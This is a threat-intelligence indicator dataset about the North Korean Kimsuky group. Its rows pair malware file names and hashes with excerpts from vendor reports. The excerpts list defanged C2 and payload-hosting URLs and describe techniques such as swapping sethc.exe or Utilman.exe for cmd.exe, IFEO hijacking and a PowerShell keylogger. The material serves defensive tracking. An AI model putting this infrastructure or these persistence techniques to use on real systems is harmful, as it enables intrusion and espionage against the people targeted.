1.0.0,actor--kimsuky,artifact--sha256:ecf27c035dfd5a5d3280e2dc15a83202b893ac6d8e5602303535c6619c3ecbc6,observation--sha256:af22caf2ce0895fb6f313178620ab1b104d35acfc5431a2fec0065978201a85c,file-name,RdpScan_La_1226.exe,RdpScan_La_1226.exe,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c76bcfe519814acbcf29a3c61331fb727b2fbddc7d2476bc8f27d3aa01705ade,observation--sha256:07004b2576939fcf746917183b3ce6849fe1c51959bc00c62101899d41f6fb8c,file-name,RdpScan_ZoHoo_1216.exe,RdpScan_ZoHoo_1216.exe,candidate,2023-07-16T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 86}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"RdpScan_ZoHoo_1216.exe Connects to network 59.103.***.***:3389(PK) Trojan/Win32.NsSpy 4 URLs mapped (indicated in light red) accessed for malware and phishing testing purposes in 18*.10*.21*.11*(KR) %SystemDrive%\users\%ASD%\appdata\roaming\chrom Operation Covert Stalker Report 2023-07-16 17:45:49 2023-07-16 10:43:10 Data Trojan/Win32.NsSpy 15:47:45 2023-03-11 72.255***.***:3389(PK) Since there are frequently used patterns, you can consider them as a blocking policy in your firewall, but be care",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c76bcfe519814acbcf29a3c61331fb727b2fbddc7d2476bc8f27d3aa01705ade,observation--sha256:0d22c4dcc63aed4e1f0ecc336ac10fd1db0f1e91b34dcdbf64ecbda3026332ff,file-name,RdpScan_ZoHoo_1216.exe,RdpScan_ZoHoo_1216.exe,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:4b130e53713317c000d3954b17d77d306b75874d83d4e2fcd6ca4763ac1d5ff3,observation--sha256:b410905979194e71c8764ea7706175b7720915c0ed807ebd446bec5f21c02151,file-name,RdpScan_Zooho01.exe,RdpScan_Zooho01.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:4b130e53713317c000d3954b17d77d306b75874d83d4e2fcd6ca4763ac1d5ff3,observation--sha256:d9caa03cba1a8ec040368d3c408d716d6336ed6ea154fdb10e3a4912a9809c48,file-name,RdpScan_Zooho01.exe,RdpScan_Zooho01.exe,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d5c806414912a5ee949f86674f21eb07ebad4af7e7f4012aa85acd7cbbc0af2c,observation--sha256:752886130ba0f80f50f9513c412fc0a464cf27f9efa344ecccd8462a4273a857,file-name,Reg.exe,Reg.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Conclusion Despite deployment of moderate technical capabilities, Kimsuky’s skill in social engineering and persistent approach makes them a formidable adversary. As we track Kimsuky, it remains clear one of the best mitigations is vigilance. This includes both hardening with technical controls around email or corporate monitoring, and the softer side user awareness training or sharing research. Rapid7 Labs will continue researching and publishing insights and guidance on defending against pe",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9d83d50d4a17fc54a4367a6fe27b793a9bbc8f58fe783ab7018bf039707fc530,observation--sha256:96642a884e0639c2843d9f60caad39054874ed5e31b2a6982f0dfd73ac60bbcb,file-name,Request.docx,Request.docx,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 62}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Bait file name National Assembly Legislative Research Service Advisory Request.docx Data URL Bait file name Analysis of North Korea’s foreign currency acquisition channels and measures to improve the effectiveness of sanctions against North Korea.pdf URL hxxps://attach.mail.daum.net/bigfile/v1/urls/d/JClVvbVCUf8Hfp Z-7_-A2w8PqyU/ JKH7ptbHMvh7XOnhrJ7UlQ (expired) Phishing URL 1 ****Institute, ******ng (***, former Minister of **) hacking target **University, ***kim*** (**, Professor) Phishing URL",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7cef982e4f0bf12b2ed2a4ab7b94b37245478a6755bc14a4de93d593864b7fee,observation--sha256:a1bd92c9598fbb436220d1a77276ecf9b8cda4cc87c9c622a53bf02d43d7438e,file-name,RouterScan.exe,RouterScan.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"hxxps://www.nirsoft.net/utils/internet_explorer_password.html Dictionary assignment attack on a specific service account advanced_port_scanner_console.exe pspv.exe mspass.exe Scanners that can specify IP bands, specific ports, or port ranges Port scanner for specific ports by setting IP bands for each country Extract account information saved in Outlook, Internet Explorer, MSN Explorer Official site: hxxps://www.nirsoft.net/utils/pspv.html explanation advanced_port_scanner.exe netpass64.exe Oper",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7cef982e4f0bf12b2ed2a4ab7b94b37245478a6755bc14a4de93d593864b7fee,observation--sha256:137fdadcb720f95ff496c1b8211a12d56129a4de1f2844361ef38a266660e860,file-name,RouterScan.exe,RouterScan.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Vulnerability scanning is also possible. rdpv.exe (Remote Administration Tool) (Table 5) Exploited public programs Since communication with the internal system is impossible in the usage environment without going through a router, vulnerability scanning is also impossible. Remote management program official site: hxxps://www.ammyy.com/en/ Extract RDP account information remote management program RDP Wrapper explanation Additionally, exploiting publicly available programs can make it difficult fo",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:5a21ac12304dc8ec37c61924e9df88100904e47123ddf3edd84710fc56c15739,observation--sha256:3efc9bf2cb8a551e1027094a7764aca1db638c08ad73d4df63d833723f5ba35e,file-name,Schedule_.doc,Schedule_.doc,candidate,2019-02-22T00:00:00Z,day,known,same-record,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 21}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,MD5 4118b251c977a682ebb4993601b9a7e3 File Name Schedule_.doc Last Modified Date (KST) 2019-02-22 17:09 Last Modified Name JamFedura C2 http://192.186.142[.]74/post/Yluhi0.hta MD5 29fbf69e72c0daac57d2cbba11bbfaa5 File Name xCryptoCrash_Schedule.doc Last Modified Date (KST) 2019-02-25 02:26 Last Modified Name JamFedura C2 http://192.186.142[.]74/post/Yluhi0.hta MD5 397ba1d0601558dfe34cd5aafaedd18e File Name white_paper.doc Last Modified Date (KST) 2019-02-26 15:40 Last Modified Name JamFedura C2 h,
1.0.0,actor--kimsuky,artifact--sha256:96f0e1ed712b7ac54c16ddcaa66123d8c14518799cf801334b0fb2f452f9171e,observation--sha256:d1201bf7c9f833dcae9d5c2f2ba603f94be0e0d12baf0931d89c7d4bf0ba0eb8,file-name,Second.hta,Second.hta,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 3}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"Post0.Send: t0=Post0.responseText: Execute(t0) The malicious script code goes through stages 1-3 of the following steps, runs a PowerShell- based keylogger, and secretly collects information from the infected computer, then registers itself in the system registry to conduct espionage operations by communicating with its C2 server. - http://naban.co[.]kr/mobile/skin/member/ctml/v/first.hta - http://naban.co[.]kr/mobile/skin/member/ctml/v/expres.php?op=1 - http://naban.co[.]kr/mobile/skin/member/c",
1.0.0,actor--kimsuky,artifact--sha256:ab35b01edc8a9ef1dc1e5c34479ea0e50bca257209200697a28d4b15c5146464,observation--sha256:e66738451ffb0b474773e4f347b604c4085e2791385b905117301db24d2343f4,file-name,SharpTongue-pwning-your-foreign-policy-one-interview-request-at-a-time.pdf,SharpTongue-pwning-your-foreign-policy-one-interview-request-at-a-time.pdf,candidate,2024-03-20T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"17 References 1. NSA, DPRK Cyber Actors Impersonating Targets to Collect Intelligence https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press- Release-View/Article/3413621/us-rok-agencies-alert-dprk-cyber-actors- impersonating-targets-to-collect-intell/ 2. Tom Lancaster, SHARPTONGUE: PWNING YOUR FOREIGN POLICY, ONE INTERVIEW REQUEST AT A TIME https://www.virusbulletin.com/uploads/pdf/conference/vb2023/papers/ SharpTongue-pwning-your-foreign-policy-one-interview-request-at-a-time.pdf 3. Pr",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:358144b7c0fc002bc12c7a4f8cb0aca49871ef7c38cb9e537aa34d85a460e260,observation--sha256:c76113d492bd193386bb0b81c5fd8c3a2e1e1615225ad7285221635f575fc2d0,file-name,Study.pdf,Study.pdf,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 88}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"V3 diagnosis name Consent Form_Princeton Study.pdf Zoom meeting information Opinions on the unification of the Korean Peninsula and the situation in neighboring countries This is the blocking log. pbA== _MAL_BLOCK North Korea's Nuclear Threat: South Korea's Perceptions and US Deterrence of Nuclear Expansion This is a document containing information related to the state of affairs in the country. We must build a prosperous homeland.docx When executing a malicious batch file, it is part of the dec",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6ef79e374332e2db877796774ba5be17c86aca0b3355bff030a6eb08344b3526,observation--sha256:69f0dc4d1fdbcb76f775067e61408dfb5af5463849e5b0d3ead8f8bb11e55423,file-name,Summit-24Mar-rev26Mar19.doc,Summit-24Mar-rev26Mar19.doc,candidate,2019-03-21T00:00:00Z,day,known,same-record,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 19}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,File Name Speaking notes-ExMon Deterrence Summit-24Mar-rev26Mar19.doc Last Modified Date (KST) 2019-03-21 17:42 Last Modified Name windowsmb C2 https://login-main.bigwnet[.]com/attachment/view/Msgxo0.hta MD5 7ca1a603a7440f1031c666afbe44afc8 File Name Speaking notes-ExMon Deterrence Summit-24Mar-rev26Mar19.doc Last Modified Date (KST) 2019-03-26 09:45 Last Modified Name windowsmb C2 n/a MD5 60973af3b8ecbbb0ab659124409b7df1 File Name Speaking notes-ExMon Deterrence Summit-24Mar-rev26Mar19.doc Last,
1.0.0,actor--kimsuky,artifact--sha256:2e5d2ff322db7b61506d957c29c2c78d8907375f92f452085531e4fa87aaac3b,observation--sha256:e9e172345dc70be1cc93f0c445a51b19a64320e6adbe005ed831195614b2945d,file-name,Summit.hwp,Summit.hwp,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 2}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"[Figure 1] E-mail disguised as government official's remarks about Korea-US Summit The threat actor attempts to trick users into opening the email titled “Government official's remarks about Korea-US Summit, with a malicious .hwp attachment named ‘Government official's remarks about Korea-US Summit.hwp’. As the distributed malicious hwp document file was encrypted, the EPS vulnerability could not be exploited without entering the password. When a document file vulnerability is triggered, it atte",
1.0.0,actor--kimsuky,artifact--sha256:2e5d2ff322db7b61506d957c29c2c78d8907375f92f452085531e4fa87aaac3b,observation--sha256:d70e840b02775c238eeb8d178d745c65a6782b4d601b69c54151549850854c46,file-name,Summit.hwp,Summit.hwp,candidate,2019-04-30T00:00:00Z,day,known,same-record,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 4}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"When the malicious HWP document is executed, the title ‘Government official's remarks about Korea-US Summit.hwp(20190409)’ and the content will be displayed. The document is registered with the account 'Tom', which is the same as that of 'Stealth Power' operation. [Figure 1-1] Screen shown after running malicious HWP and the 'Tom' account A malicious .doc' file named 'TaskForceReport.doc', which was created at 05:15 pm (KST) on April 01, 2019, has been discovered abroad. ESRC has observed that t",
1.0.0,actor--kimsuky,artifact--sha256:f29a83231d21d2d2b79d89777ac377285eb1f1e7ac7ac45cce926c906ad40833,observation--sha256:a7f003c30c6e5617100266168d567ec19942f825642461b76a6266f79c66df06,file-name,TaskForceReport.doc,TaskForceReport.doc,candidate,2019-03-21T00:00:00Z,day,known,same-record,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 19}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,File Name Speaking notes-ExMon Deterrence Summit-24Mar-rev26Mar19.doc Last Modified Date (KST) 2019-03-21 17:42 Last Modified Name windowsmb C2 https://login-main.bigwnet[.]com/attachment/view/Msgxo0.hta MD5 7ca1a603a7440f1031c666afbe44afc8 File Name Speaking notes-ExMon Deterrence Summit-24Mar-rev26Mar19.doc Last Modified Date (KST) 2019-03-26 09:45 Last Modified Name windowsmb C2 n/a MD5 60973af3b8ecbbb0ab659124409b7df1 File Name Speaking notes-ExMon Deterrence Summit-24Mar-rev26Mar19.doc Last,
1.0.0,actor--kimsuky,artifact--sha256:f29a83231d21d2d2b79d89777ac377285eb1f1e7ac7ac45cce926c906ad40833,observation--sha256:49d9e9cbc3f588c8b721b1eb7df04583a95978d7a0eccedacfb4d26425ba6529,file-name,TaskForceReport.doc,TaskForceReport.doc,candidate,2019-04-30T00:00:00Z,day,known,same-record,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 4}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"When the malicious HWP document is executed, the title ‘Government official's remarks about Korea-US Summit.hwp(20190409)’ and the content will be displayed. The document is registered with the account 'Tom', which is the same as that of 'Stealth Power' operation. [Figure 1-1] Screen shown after running malicious HWP and the 'Tom' account A malicious .doc' file named 'TaskForceReport.doc', which was created at 05:15 pm (KST) on April 01, 2019, has been discovered abroad. ESRC has observed that t",
1.0.0,actor--kimsuky,artifact--sha256:f29a83231d21d2d2b79d89777ac377285eb1f1e7ac7ac45cce926c906ad40833,observation--sha256:7bbdb8d7cd6d598047d4606ec91d0d14b502acaa05925a983dc67d0f4d625b11,file-name,TaskForceReport.doc,TaskForceReport.doc,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 5}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"The malicious HWP document files, which have been found in Korea from the end of March to the beginning of April, exploited the same vulnerability and the same account name 'Tom'. [Figure 1-2] Metadata of HWP malicious document file ■ Background of the APT Campaign ‘Smoke Screen’, the master of camouflage and smokescreen tactics The malicious file 'TaskForceReport.doc' was first reported abroad, but the document was written in Korean, and numerous similar variants have been found. The author of ",
1.0.0,actor--kimsuky,artifact--sha256:f29a83231d21d2d2b79d89777ac377285eb1f1e7ac7ac45cce926c906ad40833,observation--sha256:1a097c03e1fcf606d184d09323325def5ec5ca9531d335c35ecb0363add68c3b,file-name,TaskForceReport.doc,TaskForceReport.doc,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 6}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"Some accounts are registered on the Korean messenger Kakao Talk, and they are using the messenger services such as Telegram and Skype as well. ESRC believes that there are 'state-sponsored actors' behind the APT attack based on the analyzed data, and named the APT attack 'Campaign Smoke Screen', concerning that the attackers are fluent in Korean and English and act secretly by abusing the stolen profiles that are using photos of foreigners. ■ Analysis of tactics and threat vector of DOC-based AP",
1.0.0,actor--kimsuky,artifact--sha256:f29a83231d21d2d2b79d89777ac377285eb1f1e7ac7ac45cce926c906ad40833,observation--sha256:c1ff13dd898998d5d1c63e420ead2757689bb400be80eb75b05caff356d9962b,file-name,TaskForceReport.doc,TaskForceReport.doc,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 9}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,[Figure 3] Code of 'activeX2.bin' file Another variant with the same name as the 'TaskForceReport.doc' (MD5: 0f77143ce98d0b9f69c802789e3b1713) file has been propagated in March. - https://christinadudley[.]com/public_html/includes/common/Qfnaq0.hta - https://christinadudley[.]com/public_html/includes/common/expres.php?op=1 - https://christinadudley[.]com/public_html/includes/common/cow.php?op=Normal.src - https://christinadudley[.]com/public_html/includes/common/Normal.src - https://christinadud,
1.0.0,actor--kimsuky,artifact--sha256:9f71842d1ca35d9b9bdb2cffd59495eb3802ec1660afd7b30049dfec500b34c8,observation--sha256:b1420f9280b68a2cace36158b8859c76bcff8bdf7d155eaccfb0ad5644a339d7,file-name,Task_Force_report.doc,Task_Force_report.doc,candidate,2019-03-05T00:00:00Z,day,known,same-record,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 18}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,[Figure 9] String ‘cowboy’ inside the malware Variants created from February to April 2019 are categorized by time zone as follows. File Name Task_Force_report.doc Last Modified Date (KST) 2019-03-05 18:18 Last Modified Name windowsmb C2 https://christinadudley[.]com/public_html/includes/common/Qfnaq.hta MD5 0f77143ce98d0b9f69c802789e3b1713 File Name Task_Force_report.doc Last Modified Date (KST) 2019-03-05 18:17 Last Modified Name windowsmb C2 https://christinadudley[.]com/public_html/includes/,
1.0.0,actor--kimsuky,artifact--sha256:3dd666d852c2952782ca69c5b931a913f849a06f56c2546b02852cd8c73db6de,observation--sha256:c2b5bec100a696705c144092c8b2c98c0d7f9528260c4958c0d6eb3306e38206,file-name,Template.doc,Template.doc,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--b637a112eaeac062,kimsuky/monthreport/ATIP_2023_May_Threat-Trend-Report-on-Kimsuky-Group.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"May 2023 Threat Trend Report on Kimsuky Group 11 Indicators Of Compromise (IOC) A portion of the following IOC s quotes other analysis reports, and there are some cases that could not be verified because samples could not be obtained. Updates may occur without prior notice when new information is found. File Paths and Names The file paths and names used by the threat group are as follows. File names of some malware or tools may be the same as those of normal files. r_enc.bin demo.txt [붇임] 약력 양식.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b9f20120502ce2362e40df543e821f990a0e8b7db404049bb0233e956eeae5b3,observation--sha256:3dc5ce2080968b73f20965f8f832b077fafaf75f1105f6f7675e85487c2f1a46,file-name,[Trojan.Downloader.CHM,Trojan.Downloader.CHM,candidate,2023-03-08T00:00:00Z,day,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 65}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,Threat IntelligenceReport 8. 참고자료(Reference) [1] Ahnlab(2023.03.08) - 대북관련질문지를위장한CHM악성코드(Kimsuky) [2] Zscaler (2023.03.21) - TheUnintentional Leak: Aglimpseintotheattackvectors of APT37 [3] Ahnlab(2023.07.20) - 국내금융기업및보험사를사칭한CHM악성코드 [4] Ahnlab(2023.07.21) - CHM파일로유포되는정보유출악성코드 [5] HAURI (2023.08.01) - (주의) 금융기관을사칭하는피싱메일주의 [6] ESTsecurity(2023.08.25) - [Trojan.Downloader.CHM] 악성코드분석보고서 Genians SecurityCenter 64,
1.0.0,actor--kimsuky,artifact--sha256:16478d2966f9785e3c9066b0ab561411ab67ed66d5ccaca117eb2b7458ad772b,observation--sha256:85b4c5efbb7d746e5be6d5196264b00dd2524d1dc55eb7ce61eac64750a36644,file-name,Turns-A-Nightmare-Into-Reality.pdf,Turns-A-Nightmare-Into-Reality.pdf,candidate,2021-06-01T00:00:00Z,month,known,same-record,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 27}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 27VIRUS BULLETIN CONFERENCE OCTOBER 2021 [7] Kuo, J.-L.; Liao, Z.-C. “We are about to land.”: How CloudDragon Turns a Nightmare into Reality. Black Hat Asia 2021. https://i.blackhat.com/asia-21/Friday-Handouts/as-21-Kuo-We-Are-About-To-Land-How-CloudDragon- Turns-A-Nightmare-Into-Reality.pdf. [8] Tencent. The Kimsuky APT organization uses a new AppleSeed Android component disguised as security software to attack specific ",
1.0.0,actor--kimsuky,artifact--sha256:6df8b6faac2597bad25e967bca870d796e2232b693ddec1c38ea08ad4f9f5429,observation--sha256:0ae41ecec74f824f08e1048038730b8f8507e0d98907234b717cbda89804c034,file-name,TutClient.pdb,TutClient.pdb,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--b637a112eaeac062,kimsuky/monthreport/ATIP_2023_May_Threat-Trend-Report-on-Kimsuky-Group.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"May 2023 Threat Trend Report on Kimsuky Group 11 Indicators Of Compromise (IOC) A portion of the following IOC s quotes other analysis reports, and there are some cases that could not be verified because samples could not be obtained. Updates may occur without prior notice when new information is found. File Paths and Names The file paths and names used by the threat group are as follows. File names of some malware or tools may be the same as those of normal files. r_enc.bin demo.txt [붇임] 약력 양식.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b9d43b3db1353055faab462946f9b61e567645ebfeb8c5607492db91504f24f8,observation--sha256:96797673146b8fd7082ade83ab6f218f960ba15e4c204ae24b415c2b916a7b1c,file-name,Update_3.5.1.exe,Update_3.5.1.exe,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 18}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 18 VIRUS BULLETIN CONFERENCE OCTOBER 2021 In the case of sending and receiving mail internally, due to the fact that the internal mail didn’t go through a separate security solution, executable malware could be distributed. V3 Update_3.5.1.exe (Dropper): 686e3874b772c806e0809fcb933b50ff C:\ProgramData\Software\Microsoft\Windows\Defender\AutoUpdate.dll (AppleSeed):46c4c19a61e034e7b35e70c459f5692f dropper-regsvr32(x86).dll(",
1.0.0,actor--kimsuky,artifact--sha256:cfb1ab180b4855607dcb949534f61faf18800c46194932ab2e4d7de543d9d25e,observation--sha256:af7b4ffd48b6e15094a0a240d98aca4840fea2f93c9441537521b12434dffccb,file-name,Utilman.exe,Utilman.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The types of virtual channels are as follows. Right picture of (Figure 9) ÿ rdpdr: File system extension. Access from server to client file system (Table 2) Condition comparison code of r_sethc_x64.exe To activate the sticky key function, press the Shift key five times in succession and the sticky key window will appear as shown below (Figure 10), which is handled by sethc.exe. However, if cmd.exe is copied to secthc.exe, cmd.exe can be executed by pressing the Shift key five times in a row, so ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:cfb1ab180b4855607dcb949534f61faf18800c46194932ab2e4d7de543d9d25e,observation--sha256:7968cba201299673b7c5e123b8a89f694ef6f3a088ce076149aa713aad375c8d,file-name,Utilman.exe,Utilman.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"For user convenience, when logging in, Windows 7 places the Accessibility ( ) button at the bottom left and clicks it to display accessibility settings as shown below (Figure 11), allowing users to set the environment to suit their preferences. The responsible file is Utilman.exe. Like sethc.exe, back up Utilman.exe to another file and then run cmd.exe. (Figure 11) Accessibility and using the magnifying glass feature 19 If you copy it as Utilman.exe, when you click the Accessibility button when ",Actor-directory corpus sweep; ambiguous values remain candidates.
